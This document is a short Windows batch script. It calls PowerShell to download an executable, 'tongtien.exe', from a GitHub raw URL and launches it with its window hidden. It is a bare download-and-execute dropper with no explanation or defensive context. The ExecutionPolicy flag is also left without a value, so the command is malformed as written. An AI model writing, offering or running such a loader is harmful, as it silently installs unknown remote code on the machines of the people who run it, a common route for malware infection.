@echo off
powershell.exe -NoProfile -ExecutionPolicy -Command "Invoke-WebRequest -Uri 'https://github.com/yoBDaSMi/ttv/raw/main/tongtien.exe' -OutFile 'tongtien.exe'; Start-Process -FilePath 'tongtien.exe' -Windowstyle Hidden"
